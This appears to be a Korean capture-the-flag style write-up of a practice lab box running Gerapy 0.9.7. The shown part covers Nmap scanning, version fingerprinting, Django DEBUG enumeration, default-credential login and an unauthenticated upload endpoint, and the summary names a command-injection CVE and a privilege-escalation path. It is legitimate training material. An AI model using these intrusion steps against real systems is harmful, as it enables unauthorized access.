---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/default-creds
  - tech/web/cmd-injection
  - tech/lin/capabilities
  - tech/enum/peas
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.24
ports: [22, 8000]
services: [http, ssh]
cves: [CVE-2021-43857]
status: solved
manual_tags: true
tech_count: 5
---
> [!info] PG Practice — Pentester Foundations #3
> 타겟 192.168.248.24 · OS Ubuntu 22.04 · 난이도 Fundamental · 플래그 2개
> 경로 요약 — 8000 Gerapy `admin:admin` → `parse` 명령주입(CVE-2021-43857) → `app` → 권한상승 2경로: `python3.10` cap_setuid / `app.service` 평문 root 비밀번호

## 0. 이 박스에서 배우는 것

- 버전 판정을 독립 근거 2개의 교차로 못박는 방법. 근거의 *개수*가 아니라 *독립성*이 관건이다. 여기서는 URLconf 런타임 동작(A)과 webpack 자산 30개 대조(B)가 교차해 0.9.7로 확정됐고, 덤으로 푸터 버전 문자열이 출제자에 의해 삽입된 것임까지 드러났다(1-2)
- 다만 판정이 끝난 지점에서 멈추는 쪽이 더 어렵다. A만으로 이미 "세 후보 전부 취약"이 나와 있었다. B는 정확했지만 이 박스에서 가장 오래 걸린 구간이었다(6장 ⑧). 시험 시계에서 정밀도는 점수가 아니다
- "없다"를 입증하는 것은 "있다"보다 어렵다. 이 노트의 증거 B는 적대적 검증에서 "wheel 을 받은 적이 없다 → 날조"로 판정돼 통째로 삭제됐다가, `~/.cache/pip` 에 남아 있던 wheel 로 전항목 복원됐다. **부재 증거를 존재 부정으로 승격시키지 마라**
- `DEBUG = True` 가 그 자체로 취약점인 이유 — Django 404 페이지가 URLconf 전체를 덤프한다. 디렉터리 브루트포싱이 통째로 생략된다
- `shell=True` 명령주입의 메커니즘 — 왜 백틱인가, 왜 `/bin/bash -c` 로 한 번 더 감싸야 하는가, 왜 출력이 안 돌아오는가
- Linux capabilities — SUID와 무엇이 다른가, `cap_setuid` 가 왜 root가 되는가, `getcap -r /` 출력에서 정상(`ping` 의 `cap_net_raw`)과 비정상(인터프리터)을 가려내는 눈
- 공개 익스플로잇이 죽었을 때 전제조건을 직접 만들어주는 접근. EDB 50640은 "프로젝트가 최소 1개"를 암묵 전제로 깔고 있는데, 그것은 스크립트의 한계이지 취약점의 전제조건이 아니다(2-6) — 이 구분이 이 노트에서 한 번 무너졌다
- 권한상승 경로가 둘일 때의 우열 판단 — "root가 됐다"가 아니라 "안정적인 발판이 됐다"가 기준이다

시험 출제 가능성은 높은데, CVE-2021-43857 자체보다는 구성 요소별로 나온다. 관리 UI + 기본 자격증명 + 인증 후 명령주입은 OSCP 웹 박스의 가장 흔한 골격이고 제품만 바뀐다(Gerapy → Jenkins·Rundeck·Ajenti·Webmin·Cacti…). 개발 서버 배너에서 `DEBUG=True` 를 의심하고 정보 노출로 넘어가는 흐름은 Django/Flask/Rails 어디서나 같은 모양이다. `getcap` 으로 푸는 권한상승은 SUID 다음으로 자주 나오는 리눅스 privesc 유형이고(`python`·`perl`·`tar`·`gdb` 에 붙은 capability), 설정 파일이나 주석에 박힌 평문 비밀번호는 시험에서 가장 자주 통하는 저비용 열거다 — `/etc/systemd/system/`·`/opt`·`.env`·백업 파일.

변형 예상: 주입 파라미터가 `spider` 가 아니라 파일명·호스트명·검색어이거나, capability가 `cap_setuid` 대신 `cap_dac_read_search`(=`/etc/shadow` 읽기)로 바뀌는 형태.

---

## 1. 정찰

### 1-1. Nmap

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.24
Nmap scan report for 192.168.248.24
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
8000/tcp open  http    WSGIServer 0.2 (Python 3.10.6)
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
|_http-title: Gerapy
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
# Nmap done at Wed Aug 19 17:29:01 2026 -- 1 IP address (1 host up) scanned in 42.07 seconds
```

위 블록은 `~/PG/Levram/nmap.log` 원문에서 OS 지문 덤프와 트레이스라우트만 걷어낸 것이다. `Nmap scan report for` 줄은 반드시 남긴다 — 색인 스크립트(`_INDEX/_tools/extract.py`)가 그 줄에서 `ip:` 를 뽑기 때문에, 본문에 없으면 부록의 옛 IP를 집어간다. 이 노트의 프론트매터가 한동안 `192.168.161.24`(2026-06-26 인스턴스)로 잘못 박혀 있었던 원인이 그것이다.

플래그별로 무엇을 잃는지:

| 플래그 | 역할 | 빼면 어떻게 되나 |
|---|---|---|
| `-sCV` | 기본 NSE 스크립트 + 서비스/버전 탐지 | 배너를 못 얻는다. `WSGIServer 0.2` 라는 이 박스의 첫 단서가 통째로 사라진다 |
| `-p-` | 전 65535 포트 | 8000은 기본 1000포트 밖이다. 안 돌리면 SSH만 보고 끝난다 |
| `-Pn` | 핑 스캔 생략 | ICMP를 막은 타겟이면 "호스트 다운"으로 오판해 스캔 자체가 안 돈다. PG/시험 랩에서는 항상 붙인다 |
| `--min-rate 5000` | 초당 최소 패킷 | 없으면 `-p-` 가 수십 분 걸린다. 시험의 24시간을 갉아먹는 주범 |
| `-A` | OS/트레이스라우트/스크립트 묶음 | 없어도 되지만 초기 정찰에서는 정보량이 이득 |
| `-oN nmap.log` | 사람이 읽는 포맷으로 저장 | 재스캔 비용을 없앤다. 시험 보고서 증거로도 쓴다 |

포트가 딱 둘이다. `WSGIServer 0.2` 는 Django 개발 서버다. 이 배너 자체가 정보다 — 운영 환경에 개발 서버를 띄웠다는 뜻이고, 그렇다면 `DEBUG = True` 일 가능성이 높다.

배너에서 바로 다음 수가 나오는 조합들:

| 배너 | 즉시 의심할 것 |
|---|---|
| `WSGIServer/0.2 CPython/x.y` | Django `runserver` → `DEBUG=True` → 아무 경로나 때려 스택트레이스/URLconf 확인 |
| `Werkzeug/x.y Python/x.y` | Flask 개발 서버 → `/console` (Werkzeug 디버거 PIN) 확인 |
| `WEBrick` | Ruby 개발 서버 → 동일 계열 |
| `gunicorn`·`uWSGI`·`nginx` | 운영 구성 → `DEBUG` 기대치 낮춤. 앱 자체를 파야 한다 |

`<title>Gerapy</title>` 로 제품 확정. Gerapy = Scrapy 분산 크롤러 관리 UI(Django 기반).

### 1-2. 버전 특정 — 독립 근거 2개로 패치 경계를 가른다

[[Hub]]에서 `readme.txt` 하나를 믿었다가 버전을 틀렸다. 그 교훈을 적용해 제품이 스스로 말하는 값이 아닌 근거를 찾았다. 원리와 일반화는 2-1에서 다루고, 여기서는 관측 원문만 남긴다.

근거는 셋인데 판정에 세는 것은 앞의 둘이다:

| | 근거 | 성격 | 판정에 세는가 |
|---|---|---|---|
| A | 라이브 URLconf 의 트레일링 슬래시 | 서버측 코드의 런타임 동작 | ○ 기준축 |
| B | webpack 자산 파일명 집합을 정품 wheel 과 대조 | 프런트엔드 빌드 산출물 | ○ A와 독립 |
| C | UI 푸터 `Gerapy v0.9.7` | 제품이 스스로 선언한 문자열 | ✕ 위조 비용 0 |

증거 B 는 한 번 "날조"로 판정돼 삭제됐다가 철회·복원됐다(2026-08-20). 적대적 검증자가 `~/PG/` 와 `/tmp/gv/` 만 뒤져 "wheel 이 없으니 대조한 적도 없다"고 단정한 것인데, `pip` 는 내려받은 wheel 을 HTTP 캐시(`~/.cache/pip/http-v2/…/*.body`)에 남긴다. 그 캐시에서 wheel 3종을 꺼내 전수 재대조한 결과 아래 서술이 항목별로 전부 일치했다. 재현 절차는 이 절 끝에 붙였다.

**증거 A — 라이브 URLconf의 트레일링 슬래시** (서버측 런타임, 실측 완료)

`DEBUG=True` 덕에 404가 URLconf를 덤프한다. Gerapy는 0.9.8에서 URL 패턴의 끝 슬래시를 제거했으므로 이게 그대로 판별자가 된다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/zzz404 | grep -oE '\^api/(client|task|index/status)/?\$'
^api/index/status/$
^api/client/$
^api/task/$
```

PyPI에서 0.9.5~0.9.11 sdist를 받아 `gerapy/server/core/urls.py`를 해시하면 두 그룹으로 갈린다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ md5sum gerapy-0.9.*/gerapy/server/core/urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.5/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.6/.../urls.py
5d599d129a89be8629536a04aeece25a  gerapy-0.9.7/.../urls.py   ← 슬래시 있음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.8/.../urls.py   ← 슬래시 없음
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.9/.../urls.py
b083b057711ce1cf29356a8bc28e6432  gerapy-0.9.11/.../urls.py
```

→ 타겟은 **{0.9.5, 0.9.6, 0.9.7} 중 하나**이고 0.9.8 이상은 확실히 아니다.

판정이 해시 두 개에만 기대는 것은 아니다. `urls.py` 원문을 직접 보면 차이가 눈에 보인다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ grep -n 'api/client/\?\$\|api/task/\?\$\|api/index/status' \
     /tmp/gv/gerapy-0.9.{7,8}/gerapy/server/core/urls.py
gerapy-0.9.7/.../urls.py:8:    url(r'^api/index/status/$', ...)
gerapy-0.9.7/.../urls.py:9:    url(r'^api/client/$',        ...)
gerapy-0.9.7/.../urls.py:40:   url(r'^api/task/$',          ...)
gerapy-0.9.8/.../urls.py:8:    url(r'^api/index/status$',   ...)   ← 슬래시 제거
gerapy-0.9.8/.../urls.py:9:    url(r'^api/client$',         ...)
gerapy-0.9.8/.../urls.py:40:   url(r'^api/task$',           ...)
```

라이브 404가 뱉은 세 줄(`^api/index/status/$` · `^api/client/$` · `^api/task/$`)이 0.9.7 원본과 문자 단위로 같다. 슬래시 제거는 이 세 줄만이 아니라 `^api/client/(\d+)/$` → `^api/client/(\d+)$`, `^api/client/(\d+)/project/(\S+)/spider/(\S+)/$` 까지 릴리스 전역에 일괄 적용된 변경이라, 라이브 덤프에서 어느 줄을 뽑아도 같은 판정이 나온다. 표본이 넉넉하다.

**증거 B — webpack 자산 파일명 집합을 정품 wheel과 대조** (프런트엔드 빌드 산출물, 실측 완료)

Gerapy 는 프런트엔드를 webpack 으로 빌드해 `gerapy/server/core/templates/static/` 아래에 넣어 배포한다. 파일명에 `[contenthash]` 가 박혀 있으므로 자산 파일명 집합이 릴리스마다 다르다. 타겟이 서빙하는 자산 목록과 정품 배포본의 목록을 교집합으로 비교하면 A와 완전히 독립된 두 번째 축이 된다.

정품 0.9.7 wheel 의 js+css 자산은 30개다. 후보 릴리스별 교집합:

| 릴리스 | 0.9.7 자산 30개와의 공통 | 메인 번들 |
|---|---|---|
| 0.9.5 | 0 / 30 | `app.747409e0.js` |
| 0.9.6 | 0 / 30 | `app.747409e0.js` |
| 0.9.7 | **30 / 30** | `app.21167fa2.js` |
| 0.9.8 | 7 / 30 | `app.6999e9f7.js` |

0.9.5 와 0.9.6 이 같은 번들(`app.747409e0.js`)을 쓴다는 점은 짚어둘 만하다. 자산 축은 이 둘을 구분하지 못한다. 그런데도 판정에는 지장이 없다 — 필요한 것은 "패치 경계(0.9.8)의 어느 쪽인가"뿐이고, 자산 축은 0.9.7 만 30/30 으로 딱 떨어뜨린다. 축이 무엇을 구분하고 무엇을 못 구분하는지를 먼저 적어야 그 축을 어디까지 믿을지 정할 수 있다.

타겟이 서빙한 메인 번들은 `app.21167fa2.js` 로 0.9.7 정품과 파일명이 같다. 증거 A(`{0.9.5, 0.9.6, 0.9.7}`)와 교차하면 0.9.7 로 확정된다.

그런데 파일명이 같다고 내용이 같은 것은 아니었다. 크기를 대조하면 어긋난다:

| | 크기 | `Gerapy v0.9.7` 문자열 | 푸터 문구 |
|---|---|---|---|
| 정품 0.9.7 wheel | 26533 | 0건 | `Gerapy All Rights Reserved.` |
| 타겟 서빙본 | 26541 (`+8`) | 1건 | `Gerapy v0.9.7 All Rights Reserved.` |

8바이트 차이는 버전 문자열 삽입과 정합적이다 — 삽입된 ` v0.9.7` 은 공백 포함 7바이트다. `[가정]` 나머지 1바이트가 어디서 왔는지는 서빙본이 없어 확정할 수 없다(구분자 하나 더, 또는 아래 `lang` 편집과 함께 들어간 다른 변경). 정합적이라는 것과 증명된 것은 다르므로, 자릿수가 딱 맞아떨어지지 않는다는 사실을 지우지 않고 적어 둔다.

함께 확인된 편집이 하나 더 있다. 정품 0.9.7 번들은 `lang:"zh"` 1건 / `"en"` 0건인데 타겟은 `"en"` 으로 바뀌어 있었다. 출제자가 UI 를 영어로 돌려놓은 것이고, 번들을 손댄 곳이 푸터 하나가 아니었다는 뜻이다.

여기서 나온 관측이 이 절에서 가장 값이 나갔다 — **푸터 버전 문자열은 정품 산출물이 아니다.** 정품 0.9.7 번들에는 버전 문자열이 아예 없다(`grep -c 'Gerapy v0\.9\.7'` = 0). 타겟 화면의 `Gerapy v0.9.7` 은 출제자가 넣은 것이고, 그 값이 맞았다는 것은 사후에만 알 수 있다. 틀린 값을 심어 뒀다면 푸터만 믿은 사람은 그대로 끌려갔을 것이다. 콘텐츠 해시 파일명은 "이 릴리스에서 파생됐다"까지만 보증하고 "내용이 정품과 같다"는 보증하지 않는다 — 재빌드 없이 산출물을 직접 편집하면 이름은 그대로 남기 때문이다(2-1).

> [!note] 재현 절차 — wheel 은 `/tmp/gv/` 밖에도 남는다
> `pip download` 는 `-d` 로 지정한 디렉터리만 보게 만들지만, 받은 아카이브는 `pip` 의 HTTP 캐시에도 그대로 들어간다. `-d` 디렉터리를 지우거나 sdist 만 남겨 둔 뒤라도 캐시에서 꺼낼 수 있다.
> ```bash
> pip download gerapy==0.9.7 --no-deps -d /tmp/gv     # wheel 은 ~/.cache/pip 에도 남는다
>
> # 캐시에서 직접 꺼내기 — .body 파일은 확장자가 없을 뿐 실체는 wheel(zip)이다
> for f in $(find ~/.cache/pip -type f -size +100k); do
>   unzip -l "$f" 2>/dev/null | grep -q 'gerapy/server/core/templates/static' && echo "$f"
> done
> ```
> 실제로 이 방식으로 나온 것이 아래 셋이고, 크기·날짜가 릴리스와 그대로 대응한다:
> ```
> …/8b8a0978….body   26497  2020-06-21 08:07  …/static/js/app.747409e0.js   ← 0.9.5·0.9.6
> …/ce62ed1d….body   26533  2021-07-31 17:05  …/static/js/app.21167fa2.js   ← 0.9.7 (정품 26533)
> …/23310c67….body   26571  2021-12-26 10:39  …/static/js/app.6999e9f7.js   ← 0.9.8
> ```
> sdist 로는 이 축이 성립하지 않는다 — 0.9.5~0.9.9 sdist 에는 `app.*.js` 가 0개다(유일한 번들은 0.9.11 의 `app.c76ee343.js` 하나). `--no-binary :all:` 로 받으면 축을 통째로 잃는다. **`tar tzf`/`unzip -l` 로 먼저 자산 유무를 확인하라.**

> [!warning] 재현되지 않는 값이 하나 있다 — 서빙본 26541 `[가정]`
> 타겟 인스턴스가 내려간 뒤라 `curl` 로 다시 받을 수 없다. 위 표의 정품 쪽 값(26533·0건·`All Rights Reserved.`·`lang:"zh"`)은 전부 캐시 wheel 로 재검증됐지만, 서빙본 26541 은 당시 관측 기록에만 의존한다.
> 8바이트 차이가 버전 문자열 삽입과 정합적이라는 점이 방증이지만 증명은 아니다. 재현 가능한 것과 아닌 것을 갈라 적는다.

**증거 C(보조) — UI 푸터 문자열** (런타임이지만 제품이 스스로 말하는 값 → 최약)

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/static/js/app.21167fa2.js | grep -oE 'Gerapy v[0-9.]+'
Gerapy v0.9.7
```

이 근거는 판정에 세지 않는다. 푸터·`/about`·`X-Powered-By`·`<meta name="generator">` 는 전부 텍스트 한 줄이라 위조 비용이 0이다. 여기서는 결과적으로 A·B와 일치했지만 일치했다는 사실은 사후에만 알 수 있다. 판정은 A ∩ B 로 끝났고 C는 확인 사살일 뿐이며, 실제로 이 박스에서는 조작된 문자열이었다 — 정품 0.9.7 번들에 이 문자열은 존재하지 않는다(증거 B). 값이 맞았던 것은 출제자가 굳이 틀리게 심지 않았기 때문이지 이 근거가 믿을 만해서가 아니다.

CVE-2021-43857은 0.9.8에서 패치됐다. 증거 A ∩ 증거 B = 0.9.7 확정이고, 두 축은 서로 독립이다 — A를 위조하려면 서버 `urls.py` 를 고쳐야 하고(고치면 앱이 깨진다), B를 위조하려면 다른 릴리스의 자산 트리를 통째로 배포해야 한다.

다만 판정은 증거 A 하나에서 이미 끝나 있었다. 필요한 것은 정확한 버전이 아니라 패치 경계의 어느 쪽인가뿐인데, A가 `{0.9.5, 0.9.6, 0.9.7}` 로 좁혀준 순간 세 후보 전부 취약이므로 익스플로잇 판단에 남은 불확실성이 없다. 증거 B로 얻은 것은 "0.9.7 확정"이라는 정밀도와 "푸터가 조작됐다"는 부산물이고, 비용은 이 박스에서 가장 오래 걸린 구간이었다(6장 ⑧). 시험이라면 A에서 멈추고 익스플로잇으로 넘어가는 쪽이 옳다. 정밀 대조는 후보 집합이 패치 경계를 걸칠 때만 한다.

### 1-3. 열거 — Django `DEBUG=True`가 지도를 그려준다

존재하지 않는 경로를 때리면 Django가 **URLconf 전체를 덤프**한다.

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s http://192.168.248.24:8000/nonexistent | grep -oE '\^api/[^<]*' | head
^api/project/(\S+)/parse
^api/project/create
^api/project/index
...
```

> [!note] 이 절과 1-2·1-4의 `curl` 블록은 재현 절차로 읽어라 `[가정]`
> HTTP 응답 원문이 저장돼 있지 않다. 산출물로 남은 것은 `nmap.log`·`trigger.sh`·`50640.py` 뿐이고, 위 `curl` 출력들은 그 절차를 다시 밟으면 나오는 형태로 적은 것이다.
> 다만 값 자체는 1차 사료로 검증됐다 — `^api/index/status/$`·`^api/client/$`·`^api/task/$` 는 gerapy 0.9.7 `urls.py:8,9,40` 에, `^api/project/(\S+)/parse` 는 `urls.py:31` 에 그대로 있다.
> **참인 것과 실측한 것은 다르다.** 셸 프롬프트(`┌──(kali㉿kali)`)는 실측의 표식이므로, 값이 참이어도 실행 기록이 없으면 그 사실을 함께 적는다([[_WRITEUP-STANDARD]]).

`DEBUG = True` 는 그 자체로 취약점이다. 404 페이지가 전체 라우팅 테이블을 뱉으니 디렉터리 브루트포싱을 할 필요가 없다. Django/Flask 계열을 만나면 아무 경로나 하나 때려서 스택트레이스가 나오는지부터 확인한다. 나오면 열거는 거기서 끝이다.

같은 이유로 여기서는 gobuster/feroxbuster 가 쓸모없어진다. `DEBUG=True` Django는 없는 경로에도 200이 아니라 500/404 HTML을 크게 뱉으므로 응답 길이가 제각각이라 필터링이 안 잡히고, 정답인 `/api/project/<name>/parse` 는 와일드카드 세그먼트를 포함해 워드리스트로는 애초에 못 맞힌다. **스캐너를 돌리기 전에 404 본문을 눈으로 읽어라** — URLconf 덤프 한 방이 워드리스트 수십만 줄보다 정확하다.

### 1-4. 인증 — 기본 자격증명

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X POST http://192.168.248.24:8000/api/user/auth \
     -H 'Content-Type: application/json' \
     -d '{"username":"admin","password":"admin"}'
{"token":"710dcf5387645f05a0484347be4a8509ea749008"}
```

`admin:admin` 성립. 이후 모든 요청에 `Authorization: Token <값>` 을 붙인다.

> [!warning] 위 토큰 값은 재현 시 매번 달라진다
> 실제로 쓴 `trigger.sh` 는 토큰을 하드코딩하지 않고 매 실행마다 뽑아 쓴다. 이 노트의 `710dcf…` 는 한 세션의 값일 뿐이니 그대로 복붙하지 마라.
> ```bash
> TOK=$(curl -s -X POST http://TARGET:8000/api/user/auth \
>   -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin"}' \
>   | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
> ```

> [!danger] "비인증으로 열린 것은 `/api/user/auth` 하나뿐"은 거짓이다 — 이 노트가 놓친 대안 경로
> 이전 판본은 그렇게 단정했다. 0.9.7 `views.py` 를 직접 세어보면 `@api_view` 42개 중 두 곳에서 권한 데코레이터가 주석 처리돼 있다:
> ```bash
> ┌──(kali㉿kali)-[~/PG/Levram]
> └─$ grep -n '# @permission_classes' /tmp/gv/gerapy-0.9.7/gerapy/server/core/views.py
> 33:# @permission_classes([IsAuthenticated])      ← index (인덱스 페이지 렌더)
> 303:# @permission_classes([IsAuthenticated])     ← project_upload
> ```
> 즉 `POST /api/project/upload` 이 비인증으로 열려 있다. zip을 업로드해 프로젝트를 만드는 경로가 토큰 없이 도달 가능하다는 뜻이다.
> 따라서 "`admin:admin` 하나가 유일한 방벽"이라는 서술도 과장이다 — 방벽 옆에 문이 하나 더 열려 있었다.
>
> **"전부 401이더라"는 결론은 응답을 세어서가 아니라 소스의 데코레이터를 세어서 내린다.** 라이브 응답만 보면 내가 때려본 엔드포인트에 대해서만 아는 것이고, 안 때려본 곳이 항상 남는다. 오픈소스 제품이면 `grep -n 'permission_classes' views.py` 한 줄이 전수 조사다.

DRF 토큰 인증의 헤더 형식은 `Bearer` 가 아니라 `Authorization: Token <키>` 다. 반사적으로 `Bearer` 를 붙이면 전부 401이 돌아오고 "토큰이 틀렸나" 하며 시간을 태우게 된다. 401이 계속 나오면 토큰이 아니라 스킴 이름을 의심한다.

| 프레임워크 | 헤더 |
|---|---|
| DRF `TokenAuthentication` | `Authorization: Token <키>` |
| JWT (`SimpleJWT`·대부분의 OAuth2) | `Authorization: Bearer <키>` |
| 일부 자체 구현 | `X-API-Key`·`X-Auth-Token` |

DRF는 `OPTIONS`에 비인증으로 스키마를 내준다 — 파라미터 이름을 모를 때 유용하다:

```bash
┌──(kali㉿kali)-[~/PG/Levram]
└─$ curl -s -X OPTIONS http://192.168.248.24:8000/api/user/auth
{"name":"Obtain Auth Token","renders":["application/json"],
 "actions":{"POST":{"username":{"type":"string","required":true},
 "password":{"type":"string","required":true},
 "token":{"type":"string","required":false,"read_only":true}}}}
```

DRF의 `SimpleMetadata` 가 뷰의 시리얼라이저를 읽어 필드명·타입·필수 여부를 그대로 내주는 것이다. 파라미터 이름을 모를 때 추측하지 말고 `OPTIONS` 를 먼저 던진다. `/api/project/<name>/parse` 의 `spider` 같은 이름도 이 방식으로 확인할 수 있다.

---

## 2. 취약점 분석

### 2-1. 버전 판정 방법론 — 개수가 아니라 독립성, 그리고 "몇 개면 멈출 것인가"

이 박스에서 실제 익스플로잇은 `curl` 한 줄이다. 신경 써야 할 것은 타겟이 패치 경계의 어느 쪽인가 하나뿐이었다. 버전을 틀리면 취약하지 않은 CVE를 붙잡고 몇 시간을 태우는데, 이 박스는 반대편 실수도 함께 보여준다 — 판정이 이미 끝났는데 축을 하나 더 세우느라 가장 긴 구간을 썼다. 정확성과 속도는 다른 축이고 시험에서는 후자가 점수다.

두 근거가 독립이라는 말은 "출처 파일이 다르다"가 아니라 하나를 위조해도 다른 하나는 안 따라 움직인다는 뜻이다. 축으로 정리하면:

| 축 | 이 박스에서 | 위조 난이도 | 결과 |
|---|---|---|---|
| 서버측 코드의 런타임 동작 | URLconf 덤프의 트레일링 슬래시 (증거 A) | 높음 — `urls.py`를 실제로 고쳐야 하고, 고치면 앱이 깨진다 | 확보. 기준축. 이것만으로 판정 완료 |
| 프런트엔드 빌드 산출물의 파일명 집합 | webpack 자산 30개 대조 (증거 B) | 높음 — 전부 다른 릴리스와 맞추려면 그 릴리스를 통째로 배포해야 한다 | 확보. A와 독립 → 0.9.7 확정. 다만 판정에 필요하지는 않았다 |
| 제품이 스스로 선언한 문자열 | 푸터 `Gerapy v0.9.7` (증거 C) | 극히 낮음 — 텍스트 한 줄 | 확보. 판정에는 세지 않음. 실제로 조작돼 있었다 |

이 표에서 중요한 것은 축이 세 개라는 사실이 아니라 **세 축의 등급이 전혀 다르다**는 것이다. A와 B는 위조하려면 배포본 자체를 손봐야 하는 축이고 C는 텍스트 한 줄인데, 이 박스에서 실제로 손이 닿은 것이 정확히 C였다(1-2 증거 B). "근거 3개가 일치했다"는 문장은 등급을 지우면 거짓말이 된다 — 여기서 일치한 것은 강한 축 둘과 조작된 축 하나이고, 조작된 축이 우연히 맞았을 뿐이다.

반대 방향의 위험도 하나 있다. 하지 않은 대조를 근거로 세지 마라. 이 노트는 그 혐의를 한 번 받았고, 캐시에 남은 wheel 로 전항목 재현돼 벗었다. 규율 자체는 유효하다 — 확보한 축이 하나면 하나라고 적고, 적었으면 재현 절차를 함께 남긴다. 이 노트를 구한 것이 그 재현 가능성이었다.

그리고 A 하나로 이미 충분했다. "근거 2개"는 목적이 아니라 수단이고, 목적은 패치 경계의 어느 쪽인가를 틀리지 않는 것이다. 증거 A가 후보를 `{0.9.5, 0.9.6, 0.9.7}` 로 좁힌 순간 세 후보 전부 취약이므로 남은 불확실성이 익스플로잇에 아무 영향을 주지 않는다. 근거를 더 쌓아야 하는 것은 후보 집합이 패치 경계를 걸치고 있을 때뿐이다. 증거 B는 그 기준에서 초과 작업이었다 — 결과는 정확했고 부산물도 값졌지만, 시험 시계로 보면 멈췄어야 할 지점을 지나쳤다(6장 ⑧).

왜 트레일링 슬래시가 판별자가 되는가. Django의 URLconf는 정규식이다.

```
^api/client/$      ← 0.9.7까지: 슬래시가 패턴의 일부
^api/client$       ← 0.9.8부터: 제거됨
```

`$`는 문자열 끝 앵커다. `/` 유무는 디자인 취향이 아니라 매칭 규칙 자체의 변경이고, 라이브 서버가 자기 정규식을 그대로 화면에 뱉어주므로 위조하려면 서버 코드를 직접 고쳐야 한다. 릴리스 노트의 "Breaking change"가 좋은 판별자인 이유가 이것이다.

`APPEND_SLASH` 를 반대 방향으로 알고 있으면 이 판별자를 스스로 버리게 된다. Django `CommonMiddleware` 의 `APPEND_SLASH=True`(기본값)는 이름 그대로 슬래시를 붙이기만 하고 떼지 않아서 결과가 비대칭이다:

| 버전 | 패턴 | `/api/client` 로 접근 | `/api/client/` 로 접근 |
|---|---|---|---|
| 0.9.7 | `^api/client/$` | 301 → `/api/client/` (구제됨) | 200 |
| 0.9.8 | `^api/client$` | 200 | 404 (슬래시를 더 붙여도 매치 안 됨) |

브라우저에서도 차이는 보인다. 다만 슬래시를 붙였을 때만 보인다 — 0.9.7은 어느 쪽으로 때려도 결국 살고, 0.9.8은 슬래시를 붙이면 죽는다. 이전 판본은 이것을 "브라우저로는 안 보인다"고 뭉뚱그렸다. 그래도 가장 확실한 관측 지점은 404 본문에 덤프된 정규식 원문이다 — 리다이렉트 동작은 커스텀 미들웨어·프록시가 끼면 흐려지지만 덤프된 정규식은 서버 코드 그 자체다.

콘텐츠 해시 자산이 강한 축인 이유는 단순하다. webpack/vite는 번들 파일명에 `[contenthash]` 를 박고, 내용이 1바이트만 바뀌어도 이름이 바뀐다. 파일명이 내용에 대한 서명처럼 작동한다.

무너지는 지점도 분명하다. 파일명은 빌드할 때 한 번 정해지고, 그 뒤에 산출물을 직접 편집해도 재빌드를 하지 않는 한 이름은 그대로 남는다. **파일명 일치는 "이 릴리스에서 파생됐다"까지만 보증하지 "내용이 정품과 같다"는 보증하지 않는다.** 이 박스가 그 실례다 — `app.21167fa2.js` 라는 이름은 0.9.7 정품과 같은데 내용은 26533 → 26541 로 8바이트 길고, 정품에 없는 `Gerapy v0.9.7` 이 들어 있으며 `lang` 값도 `"zh"`→`"en"` 으로 바뀌어 있다(1-2 증거 B). 이름이 같다는 이유로 "정품 그대로"라고 결론지었다면 조작을 통째로 놓쳤을 것이다. 파일명은 후보를 좁히는 데 쓰고, 정품성은 `stat`/`sha256sum`/`cmp` 로 따로 확인한다. 두 작업은 다른 질문에 답한다.

제품이 스스로 말하는 버전은 언제나 최약 근거다. 푸터·`/about`·`readme.txt`·`X-Powered-By`·`<meta name="generator">` 는 전부 같은 등급이다 — 공격자에게 유용한 만큼 방어자·출제자에게도 가장 만지기 쉬운 표면이기 때문이다. [[Hub]]에서 틀린 이유가 이것이었다.

버전 특정의 일반 절차로 정리하면:

1. 런타임 동작의 차이를 찾는다 — URL 패턴, API 응답 필드, 에러 메시지 형식. 릴리스 노트의 "Breaking change"가 곧 판별자다.
2. 콘텐츠 해시가 박힌 정적 자산(webpack/vite 번들)을 공식 배포본과 대조한다. 파일 내용에서 파생되므로 신뢰도가 높다.
3. 후보를 좁혔으면 PyPI/npm/GitHub에서 실제 배포본을 받아 diff한다. 추측하지 말고 대조한다.
4. 출처가 다른 근거 2개 이상이 교차할 때만 확정한다. 근거 3개가 전부 같은 파일에서 나왔다면 그건 근거 1개다.
5. 하지 않은 대조를 근거로 세지 말고, 한 대조는 재현 절차와 함께 적는다. 실제로 했더라도 재현 경로를 안 적으면 나중에 스스로도 증명하지 못한다.
6. 판정이 끝났으면 멈춘다. 후보 집합이 전부 패치 경계의 같은 쪽이면 추가 축은 정밀도이지 판정이 아니다. ← 이 노트가 시간을 태운 지점

`[주의]` 2번은 wheel/dist 를 받아야 성립한다. PyPI에서 `pip download --no-binary :all:` 로 받으면 sdist가 오는데, 파이썬 패키지의 sdist에는 빌드된 프런트엔드 자산이 안 들어 있는 경우가 흔하다. Gerapy가 그렇다 — 0.9.5~0.9.9 sdist에 `app.*.js` 가 0개다. "받았으니 대조할 수 있다"고 가정하지 말고 `tar tzf`/`unzip -l` 로 먼저 확인한다.
